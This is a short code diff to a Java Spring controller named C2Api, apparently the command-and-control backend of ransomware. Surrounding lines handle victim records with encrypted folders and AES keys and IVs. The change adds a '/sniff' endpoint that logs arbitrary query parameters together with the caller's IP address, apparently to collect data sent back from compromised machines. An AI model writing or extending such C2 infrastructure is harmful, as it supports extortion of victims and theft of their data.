@@ -36,4 +36,14 @@ public class C2Api {
                 victimDto.getEncryptedFolder(), victimDto.getAesKey(), victimDto.getAesIv()));
     }
 
+    @GetMapping(value = "/sniff", produces = "text/plain")
+    public ResponseEntity<Void> sniff(@RequestParam Map<String, String> queryParams, HttpServletRequest request) {
+        if(request.getRemoteAddr() != null) {
+            queryParams.put("ip_address", request.getRemoteAddr());
+        }
+        
+        service.sniff(queryParams);
+        return ResponseEntity.ok().build();
+    }
+
 }
